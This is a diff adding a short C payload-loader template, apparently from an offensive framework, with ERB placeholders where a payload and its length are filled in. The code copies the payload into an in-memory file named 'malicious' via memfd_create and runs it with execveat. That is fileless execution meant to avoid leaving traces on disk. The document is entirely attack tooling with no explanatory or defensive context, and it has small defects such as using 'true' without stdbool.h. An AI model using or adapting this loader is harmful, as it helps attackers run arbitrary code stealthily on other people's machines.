@@ -1,0 +1,22 @@
+#define _GNU_SOURCE
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+
+#define SCSIZE <%= payload_length %>
+
+static char bPayload[SCSIZE] = "<%= payload %>";
+
+int main(int argc,char *argv[], char ** envp)
+{
+    int fd = memfd_create("malicious", MFD_CLOEXEC);
+    write(fd, bPayload, SCSIZE);
+    execveat(fd, NULL, NULL, NULL,AT_EMPTY_PATH);
+    while(true)
+    {
+
+    }
+    return 0;
+}
+
